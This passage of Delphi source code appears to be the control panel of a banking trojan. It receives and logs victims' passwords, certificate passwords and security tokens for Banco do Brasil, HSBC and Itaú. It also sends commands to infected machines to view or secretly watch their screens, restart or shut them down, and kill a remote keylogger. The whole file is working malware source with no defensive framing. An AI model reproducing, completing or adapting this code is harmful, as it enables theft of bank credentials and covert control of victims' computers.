        Delete(s2, 1, Pos('<|BBES|>', s2)+7);
        BBES := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Senha Cert. BB: ' + BBES;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Senha de Acesso BB EMPRESA
        if Pos('<|BBEA|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|BBEA|>', s2)+7);
        BBEA := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Senha Acesso BB: ' + BBEA;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;



        // Captura Senha da Conta HSBC
        if Pos('<|HSA4|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|HSA4|>', s2)+7);
        HSA4 := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Senha Conta: ' + HSA4;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

                 // Captura Token da Conta HSBC
        if Pos('<|HST6|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|HST6|>', s2)+7);
        HST6 := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Token: ' + HST6;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Senha 6 Dígitos ITA EMPRESA
        if Pos('<|ITE6|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|ITE6|>', s2)+7);
        ITE6 := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Senha 6 ITAÚ: ' + ITE6;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Token ITA EMPRESA
        if Pos('<|TOKE|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|TOKE|>', s2)+7);
        TOKE := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Token ITAÚ: ' + TOKE;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;


       if Pos('<|PONG|>', s)>0 then begin
        L := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
        ping1 := Integer(L.SubItems.Objects[5]);
        ping2 := GetTickCount-Ping1;
        L.SubItems[4] := intToStr(ping2);


      end;
    end;
    Sleep(10);
  end; end;

procedure TForm1.Fecharconexo1Click(Sender: TObject);
var
  Desktop: TForm2;
  Socket: TCustomWinSocket;
begin
  if LV1.ItemIndex <0 then
    exit;

  if LV1.Selected.SubItems.Objects[2] = nil then begin
    Desktop := TForm2.Create(self);
    LV1.Selected.SubItems.Objects[2] := TObject(Desktop);
    Desktop.Caption := 'Cliente..: "'+LV1.Selected.SubItems[0]+'"';
    Desktop.Show;
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Desktop.Socket := Socket;
    Socket.SendText('<|first|>');
  //Form2.Caption := 'Access PC - Cliente..: "'+LV1.Selected.SubItems[0]+'"';
  end else if (LV1.Selected.SubItems.Objects[2] as TForm2).Visible = false then begin
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket := Socket;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Show;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket.SendText('<|first|>');
  end

end;

procedure TForm1.Button1Click(Sender: TObject);
begin
 if Button1.Caption = 'Pank Smalville' then begin
  LV1.Enabled := true;
  Button1.Caption := 'Desativar';
  SS1.Port := strToInt(Edit1.Text);
  SS1.Active := true;
  if CheckBox2.Checked = True then
  begin
  SS2.Active := True;
  TrmMonitor.Enabled := True;
  end;
  Edit1.Enabled := false;
 end else begin
  LV1.Enabled := false;
  Button1.Caption := 'Pank Smalville';
  StatusBar1.Panels.Items[1].Text := 'Desativado';
  SS1.Active := false;
  SS2.Active := false;
  LV1.Clear;
  TrmMonitor.Enabled := False;
  Edit1.Enabled := true;
 end;
end;

procedure TForm1.SS1ClientError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
  L := LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then begin
    if L.SubItems.Objects[2] <> nil then begin
      if Socket = (L.SubItems.Objects[2] as TForm2).Socket then begin
        (L.SubItems.Objects[2] as TForm2).Close;
      end;
     end;
    L.Delete;
  end;

end;

procedure TForm1.SS1Listen(Sender: TObject; Socket: TCustomWinSocket);
begin

 StatusBar1.Panels.Items[1].Text := 'Pesquisando Clientes..';
end;



procedure TForm1.SS1Accept(Sender: TObject; Socket: TCustomWinSocket);
var
  TST: TSock_Thread;
begin

  TST := TSock_Thread.Create(Socket);
  TST.Resume;
end;

procedure TForm1.SS1ClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin


 L := LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then
  begin
   Label11.Caption := IntToStr(StrToInt(Label11.Caption) - 1);
    if L.SubItems.Objects[2] <> nil then
    begin
      if Socket = (L.SubItems.Objects[2] as TForm2).Socket then
      begin
        (L.SubItems.Objects[2] as TForm2).Close;
      end;
       L.Delete;
    end;
  end;
end;


procedure TForm1.Timer1Timer(Sender: TObject);
var
  i: Integer;
  Socket: TcustomWinSocket;
begin
  try
  for i := 0 to LV1.Items.Count-1 do begin
    Socket := TCustomWinSocket(Form1.LV1.Items.Item[i].SubItems.Objects[0]);
    Form1.LV1.Items.Item[i].SubItems.Objects[5] := TObject(GetTickCount);
    Socket.SendText('<|PING|>');
  end;
  except
    Form1.LV1.Items.Delete(i);
   //Application.MessageBox('adad', 'sss', 48);
  end;
end;

procedure TForm1.FecharConexo2Click(Sender: TObject);
var
  Socket: TCustomWinSocket;
begin
  if LV1.Visible = True then
  begin
  Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
  Socket.SendText('<|Close|>');
  end;

end;

procedure TForm1.ApplicationEvents1Exception(Sender: TObject;
  E: Exception);
begin
    exit;
end;

procedure TForm1.ReiniciaPCRemoto1Click(Sender: TObject);
var
Socket: TCustomWinSocket;
begin
  if LV1.Visible = True then
  begin
  Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
  Socket.SendText('<|reini|>');
end; end;

procedure TForm1.DesligarPCRemoto1Click(Sender: TObject);
var
Socket: TCustomWinSocket;
begin
  if LV1.Visible = True then
  begin
  Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
  Socket.SendText('<|desli|>');
end;

end;

procedure TForm1.Button2Click(Sender: TObject);
begin
Form3.Show;
end;

procedure TForm1.FormCreate(Sender: TObject);
var
   hMutex : integer;
begin
// Impede o Programa de Abrir 2x
hMutex := CreateMutex(0, TRUE, 'x98189x');
if GetLastError = ERROR_ALREADY_EXISTS then begin
Application.MessageBox('ATENÇÃO! Você já tem uma sessão do programa em aberto!!', 'ATENÇÃO', 64);
beep;
Application.Terminate;
end;


 If not(fileexists(PegaTempDir + '\memo.txt')) then
    filecreate(PegaTempDir + '\memo.txt');

     If not(fileexists(PegaTempDir + '\ip.txt')) then
    filecreate(PegaTempDir + '\ip.txt');
end;

procedure TForm1.AcessarPCRemotoNavegador1Click(Sender: TObject);
var
  Desktop: TForm2;
  Socket: TCustomWinSocket;
begin
//   ChecaLicenca();
   Edit6.Text := '';
   Edit6.Text := 'Navi';
//  verifica_versao;

 if LV1.ItemIndex <0 then
    exit;


  If LV1.Visible = True then
  begin
    if LV1.Selected.SubItems.Objects[2] = nil then begin
    Desktop := TForm2.Create(self);
    LV1.Selected.SubItems.Objects[2] := TObject(Desktop);
    Desktop.Caption := 'Cliente..: "'+LV1.Selected.SubItems[0]+'"';
    Desktop.Show;
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Desktop.Socket := Socket;
    Socket.SendText('<|first|>');
  //Form2.Caption := 'Access PC - Cliente..: "'+LV1.Selected.SubItems[0]+'"';
  end else if (LV1.Selected.SubItems.Objects[2] as TForm2).Visible = false then begin
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket := Socket;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Show;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket.SendText('<|first|>');
  end
  end;

end;

procedure TForm1.Timer3Timer(Sender: TObject);
var
I : Integer;
Palavra: string;
L, L2: TListItem;
begin
Label11.Caption := IntToStr(LV1.Items.Count);
for I := 0 to LV1.Items.Count-1 do
begin

if LV1.Selected.SubItems[5] <> ' ' then
//if LV1.items[i].SubItems[5] <> '' then
begin
PopupMenu1.Items[0].Enabled:=True;
PopupMenu1.Items[2].Enabled:=True;
end;

if LV1.Selected.SubItems[5] = ' ' then
//if LV1.items[i].SubItems[5] <> '' then
begin
PopupMenu1.Items[0].Enabled:=False;
PopupMenu1.Items[2].Enabled:=False;
end;
end;

end;


procedure TForm1.Button5Click(Sender: TObject);
begin
Form6.Show;
end;

procedure TForm1.BloquearIP1Click(Sender: TObject);
var
  I : Integer;
  Palavra: string;
  L, L2: TListItem;
  Socket: TCustomWinSocket;
begin
      Form6.Memo1.Lines.Add(LV1.Selected.Subitems[3]);
      Label9.Caption := LV1.Selected.Subitems[3];
      salva1;
      Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
      Socket.SendText('<|Close|>');
      Label9.Caption := '';
end;

procedure TForm1.SS1ClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  if IpIsBlocked(Form6.Memo1.Lines, Socket.RemoteAddress) then begin
  Socket.Close;
  end;
end;

procedure TForm1.FormShow(Sender: TObject);
begin
 If not(fileexists(PegaTempDir + '\ip.txt')) then
 begin
 exit;
 end
 else
 Form6.Memo1.Lines.LoadFromFile(PegaTempDir + '\ip.txt');

//If not fileexists(ExtractFilePath(Application.ExeName)+'Panela.wav') then
begin
//Application.MessageBox('ATENÇÃO! Seu arquivo de SOM não está disponível!!', 'ERRO', 64);
end;

// Checa Licença Operador
//ChecaLicenca();
end;

procedure TForm1.LV1SelectItem(Sender: TObject; Item: TListItem;
  Selected: Boolean);
begin
//LV1.items[LV1.itemindex].focused:=False;
//LV1.items[LV1.itemindex].selected:=False;
end;

procedure TForm1.LV1Click(Sender: TObject);
var
i: integer;
begin
//for i := 0 to lv1.items.count-1 do
// lv1.items.item[i].checked then
//lv1.Items.Item[i].Focused;
//lv1.Items.Item[i].Selected;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
Action:=caFree;
end;

procedure TForm1.Button8Click(Sender: TObject);
begin
Form7.Show;
end;

procedure TForm1.AcessarPCRemotoDesktop1Click(Sender: TObject);
var
  Desktop: TForm2;
  Socket: TCustomWinSocket;
 bb,cef,santa,ita,desco,hsbc: string;
begin

 //  ChecaLicenca();
   Edit6.Text := '';
   Edit6.Text := 'Desk';
//   verifica_versao;
   if LV1.ItemIndex <0 then
   exit;

  If LV1.Visible = True then
  begin

    if LV1.Selected.SubItems.Objects[2] = nil then begin
    Desktop := TForm2.Create(self);
    LV1.Selected.SubItems.Objects[2] := TObject(Desktop);
    Desktop.Caption := 'Cliente..: "'+LV1.Selected.SubItems[0]+'"';
    Desktop.Show;
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Desktop.Socket := Socket;
    Socket.SendText('<|deski|>');
  //Form2.Caption := 'Access PC - Cliente..: "'+LV1.Selected.SubItems[0]+'"';
  end else if (LV1.Selected.SubItems.Objects[2] as TForm2).Visible = false then begin
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket := Socket;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Show;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket.SendText('<|deski|>');
  end
  end;
end;

procedure TForm1.TrmAtualizaTimer(Sender: TObject);
var
I: Integer;
begin
for I := 0 to Form1.LV1.Items.Count-1 do
  begin
      if Form1.LV1.Items[i].SubItems[5] = '' then
      begin
      SS1.Active := false;
      SS1.Active := true;
      end;

end;   end;

procedure TForm1.TrmMonitorTimer(Sender: TObject);
var
  I: integer;
  ip: string;
begin
       if CheckBox2.Checked = True then
      begin

     for I := 0 to Form1.LV1.Items.Count-1 do
  begin

       if Form1.LV1.Items[i].SubItems[8] <> '' then
    begin
    exit;
    end;

      if (Aviso = Form1.LV1.Items[I].Caption) then
      begin

      if Form1.LV1.Items[i].SubItems[5] <> '' then
    begin
    Form1.LV1.Items[i].SubItems[8] := 'Cliente';
    Form1.SS2.Socket.Connections[0].SendText('Info');
    end;

    if Form1.LV1.Items[i].SubItems[5] = '' then
    begin
    Form1.SS2.Socket.Connections[0].SendText('Aviso');
    end;
    end;
    end;
    end;
end;
procedure TForm1.SS2ClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
s: string;
Stream: TMemoryStream;
begin
s:=Socket.ReceiveText;
if s = 'teste' then
  begin
  showmessage('oi');
  end;
end;

procedure TForm1.CheckBox2Click(Sender: TObject);
begin
 if CheckBox2.Enabled = True then
  begin
  SS2.Active := True;
  TrmMonitor.Enabled := True;
  end;

  if CheckBox2.Enabled = False then
  begin
  SS2.Active := False;
  TrmMonitor.Enabled := False;
  end;

end;

procedure TForm1.LV1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
 if (Item.SubItems[5] <> ' ') then
  LV1.Canvas.Brush.Color := clRed;
end;

procedure TForm1.DerrubarKLRemota1Click(Sender: TObject);
var
Socket: TCustomWinSocket;
begin
  if LV1.Visible = True then
  begin
  Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
  Socket.SendText('<|dekl|>');
end; end;

procedure TForm1.AcessarPCRemotoTelaVtima1Click(Sender: TObject);
var
  Desktop: TForm2;
  Socket: TCustomWinSocket;
begin
//   ChecaLicenca();
   Edit6.Text := '';
   Edit6.Text := 'Espiar';
//   verifica_versao;

  if LV1.ItemIndex <0 then
   exit;

  If LV1.Visible = True then
  begin
    if LV1.Selected.SubItems.Objects[2] = nil then begin
    Desktop := TForm2.Create(self);
    LV1.Selected.SubItems.Objects[2] := TObject(Desktop);
    Desktop.Caption := 'Cliente..: "'+LV1.Selected.SubItems[0]+'"';
    Desktop.Show;
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Desktop.Socket := Socket;
    Socket.SendText('<|deski|>');
  //Form2.Caption := 'Access PC - Cliente..: "'+LV1.Selected.SubItems[0]+'"';
  end else if (LV1.Selected.SubItems.Objects[2] as TForm2).Visible = false then begin
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket := Socket;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Show;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket.SendText('<|espiar|>');
  end
  end;

end;

procedure TForm1.AcessarPCRemotoSomenteWindows81Click(Sender: TObject);
var
  Desktop: TForm2;
  Socket: TCustomWinSocket;
begin
 //  ChecaLicenca();
   Edit6.Text := '';
   Edit6.Text := 'Navi';
 // verifica_versao;


  if LV1.ItemIndex <0 then
   exit;

  If LV1.Visible = True then
  begin
    if LV1.Selected.SubItems.Objects[2] = nil then begin
    Desktop := TForm2.Create(self);

    LV1.Selected.SubItems.Objects[2] := TObject(Desktop);
    Desktop.Caption := 'Cliente..: "'+LV1.Selected.SubItems[0]+'"';
    Desktop.Show;
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Desktop.Socket := Socket;
    Socket.SendText('<|first|>');
  //Form2.Caption := 'Access PC - Cliente..: "'+LV1.Selected.SubItems[0]+'"';
  end else if (LV1.Selected.SubItems.Objects[2] as TForm2).Visible = false then begin
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket := Socket;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Show;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket.SendText('<|first|>');
  end
  end;

end;

procedure TForm1.Button6Click(Sender: TObject);
begin
//MediaPlayer1.Stop;
end;

procedure TForm1.Button7Click(Sender: TObject);
begin
//MediaPlayer2.FileName := (ExtractFilePath(Application.ExeName)+'chegar.wav');
//MediaPlayer2.Open;
//MediaPlayer2.Play;
end;

procedure TForm1.Button9Click(Sender: TObject);
begin
Form2.show;
//InsereSom2(Trim(Form1.Edit7.Text), 'panelada');
end;

procedure TForm1.Button4Click(Sender: TObject);
begin
Form2.Show;
end;

procedure TForm1.Button10Click(Sender: TObject);
var
  Desktop: TForm2;
  Socket: TCustomWinSocket;
 bb,cef,santa,ita,desco,hsbc: string;
begin

 //  ChecaLicenca();
   Edit6.Text := '';
   Edit6.Text := 'Desk';
//   verifica_versao;
   if LV1.ItemIndex <0 then
   exit;

  If LV1.Visible = True then
  begin
  Form2 := TForm2.Create(nil);
  Form2.Show;
    if LV1.Selected.SubItems.Objects[2] = nil then begin
    Desktop := TForm2.Create(self);
    LV1.Selected.SubItems.Objects[2] := TObject(Desktop);
    Desktop.Caption := 'Cliente..: "'+LV1.Selected.SubItems[0]+'"';
    Desktop.Show;
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Desktop.Socket := Socket;
    Socket.SendText('<|deski|>');
  //Form2.Caption := 'Access PC - Cliente..: "'+LV1.Selected.SubItems[0]+'"';
  end else if (LV1.Selected.SubItems.Objects[2] as TForm2).Visible = false then begin
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket := Socket;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Show;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket.SendText('<|deski|>');
  end
  end;
end;

end.
